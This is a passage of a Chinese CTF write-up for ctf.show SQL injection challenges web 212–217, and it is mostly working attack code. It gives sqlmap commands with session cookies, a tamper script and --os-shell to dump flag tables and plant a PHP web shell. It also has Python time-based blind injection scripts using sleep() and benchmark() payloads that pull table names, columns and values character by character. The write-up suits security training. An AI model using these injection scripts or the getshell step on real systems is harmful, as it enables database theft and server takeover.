sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web212.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavis <span class="token parameter variable">--columns</span>
<span class="token comment"># 爆金币</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://183689c5-7f8f-4276-8687-21e10d93fbcf.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span><span class="token operator">=</span>show-web212.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span> <span class="token parameter variable">-T</span> ctfshow_flavis <span class="token parameter variable">--columns</span> <span class="token parameter variable">-C</span> ctfshow_flagxsa <span class="token parameter variable">--dump</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h2 id="web-213"><a href="#web-213" class="header-anchor">#</a> web 213</h2> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token comment">//对查询字符进行解密</span>
  <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>过滤了空格，星号...没改？</p> <p>上一题payload打一下，可以用。但是没有flag的表，这题提示考察<code>--os-shell</code></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 爆数据库 ctfshow_web</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/index.php&quot;</span>--method<span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span>--cookie<span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> show-web212.py <span class="token parameter variable">--dbs</span> 
<span class="token comment"># 爆表 ctfshow_user</span>
sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> show-web212.py <span class="token parameter variable">--dbs</span> <span class="token parameter variable">-D</span> ctfshow_web <span class="token parameter variable">--tables</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>使用<code>--os-shell</code>一键getshell</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/index.php&quot;</span> <span class="token parameter variable">--method</span><span class="token operator">=</span>put <span class="token parameter variable">--data</span><span class="token operator">=</span><span class="token string">&quot;id=1&quot;</span> <span class="token parameter variable">--headers</span><span class="token operator">=</span><span class="token string">&quot;Content-Type: text/plain&quot;</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> <span class="token parameter variable">--referer</span><span class="token operator">=</span>ctf.show <span class="token parameter variable">-D</span> ctfshow_web --safe-url<span class="token operator">=</span><span class="token string">&quot;https://e5927751-41bb-4026-a62b-afd42738d0a0.challenge.ctf.show/api/getToken.php&quot;</span> --safe-freq<span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">--tamper</span> show-web212.py --os-shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>默认会写入php文件上传的功能，具体木马由你自己生成</p> <p><img src="/medias/show-sql/upload.png" alt="upload"></p> <p>上传木马，一键日站</p> <h2 id="web-214-时间盲注"><a href="#web-214-时间盲注" class="header-anchor">#</a> web 214  时间盲注</h2> <p>看其他师傅wp做，首页bp抓包还是f12看网络请求都没有发现api接口，直接dirsearch扫描了</p> <p><img src="/medias/show-sql/time0.png" alt="time0"></p> <p>抓<code>/api/</code>的报文还是什么都没有</p> <p><img src="/medias/show-sql/214.png" alt="214"></p> <p>在网络里看到<code>select.js</code>，点进去可以看到</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>layui<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token punctuation">.</span>element<span class="token punctuation">;</span>
  element<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      <span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'api/'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">&quot;json&quot;</span><span class="token punctuation">,</span>
      <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>
      <span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token literal-property property">ip</span><span class="token operator">:</span>returnCitySN<span class="token punctuation">[</span><span class="token string">&quot;cip&quot;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
        <span class="token literal-property property">debug</span><span class="token operator">:</span><span class="token number">0</span>
      <span class="token punctuation">}</span>

    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><p>ajax通过post请求/api/接口，有ip，debug的参数</p> <p>hackbar发包，ip随便填，没有限制，debug的会影响页面是否回显。发包后返回了原sql语句<code>select id from ctfshow_info where ip = $_POST[ip]</code>，如果ip=sleep(3)，页面会缓慢的加载3秒后才响应，说明sleep执行成功</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://08d7032b-e019-444d-aeb7-2ba24dd99c9e.challenge.ctf.show/api/'</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token punctuation">,</span><span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token builtin">min</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">-</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token comment"># 爆表名(当前数据库)</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;1 or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆列</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;1 or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆值</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;1 or if(ascii(substr((select group_concat(flaga) from ctfshow_flagx),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,sleep(0.5),'False')#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sub <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        <span class="token keyword">if</span> sub <span class="token operator">&gt;=</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> j
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> j
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="web-215"><a href="#web-215" class="header-anchor">#</a> web 215</h2> <p>给<code>/api/</code>接口发请求<code>ip=1&amp;debug=1</code>，返回了sql语句<code>select id from ctfshow_info where ip = '1';</code>，把ip的值放在了单引号里，直接闭合单引号，稍加修改上题的脚本接着打</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://46aefd94-5b7e-4d82-ae3d-3210a5d35606.challenge.ctf.show/api/'</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token punctuation">,</span><span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token builtin">min</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">-</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token comment"># 爆表名 ctfshow_flagxc</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;1' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆列 flagaa</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;1' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆值 </span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;1' or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,sleep(0.5),'False')#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sub <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        <span class="token keyword">if</span> sub <span class="token operator">&gt;=</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> j
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> j
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="web-216"><a href="#web-216" class="header-anchor">#</a> web 216</h2> <p>给<code>/api/</code>接口发请求<code>ip=1&amp;debug=1</code>，返回了sql语句<code>select id from ctfshow_info where ip = from_base64($_POST[ip]);</code>，题目想接收一个base64编码的内容，不给，直接填充闭合<code>from_base64()</code>函数，稍加修改上题的脚本接着打</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://ccc4c05d-4990-48cd-b95f-6d90b024dd7f.challenge.ctf.show/api/'</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token punctuation">,</span><span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token builtin">min</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">-</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token comment"># 爆表名 ctfshow_flagxc</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;'1111') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,sleep(0.5),'False')#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        <span class="token comment"># 爆列 flagaa</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆值 </span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(flagaa) from ctfshow_flagxc),{i},1))&lt;{j},sleep(0.5),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sub <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        <span class="token keyword">if</span> sub <span class="token operator">&gt;=</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> j
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">min</span> <span class="token operator">=</span> j
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br></div></div><h2 id="web-217-benchmark"><a href="#web-217-benchmark" class="header-anchor">#</a> web 217 benchmark</h2> <p>这题ban了<code>sleep</code>函数，在SQL中还提供了<code>benchmark</code>函数</p> <div class="custom-block tip"><p class="custom-block-title">提示</p> <p>BENCHMARK 函数是 MySQL 中的一个用于性能测试的函数。它可以用来测量一个 SQL 语句或表达式的执行时间</p></div> <p>这个函数可以用来测试一个语句执行的时间</p> <p>测试5,000,000次，时间大概0.7秒</p> <p><img src="/medias/show-sql/217.png" alt="217"></p> <p>这个也挺好用，虽然没有sleep好用(痴呆，流口水.png)。太慢了(恼)，顺便买个饭去</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url <span class="token operator">=</span> <span class="token string">'http://0ca80f40-f50b-48d1-be46-a8badf78956d.challenge.ctf.show/api/'</span>
<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">min</span><span class="token punctuation">,</span><span class="token builtin">max</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token builtin">min</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token builtin">max</span><span class="token operator">-</span><span class="token builtin">min</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">min</span> <span class="token operator">==</span> j<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token comment"># 爆表名 ctfshow_flagxccb</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},benchmark(5000000,md5('1')),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆列 flagaabc</span>
        <span class="token comment"># payload = {</span>
        <span class="token comment">#     'ip': f&quot;'1111') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'),{i},1))&lt;{j},benchmark(5000000,md5('1')),'False')#&quot;,</span>
        <span class="token comment">#     'debug': 0</span>
        <span class="token comment"># }</span>
        <span class="token comment"># 爆值 </span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;'1111') or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">,1))&lt;</span><span class="token interpolation"><span class="token punctuation">{</span>j<span class="token punctuation">}</span></span><span class="token string">,benchmark(5000000,md5('1')),'False')#&quot;</span></span><span class="token punctuation">,</span>
            <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        sub <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time
        <span class="token keyword">if</span> sub <span class="token operator">&gt;=</span> <span class="token number">0.5</span><span class="token punctuation">:</span>
            <span class="token builtin">max</span> <span class="token operator">=</span> j
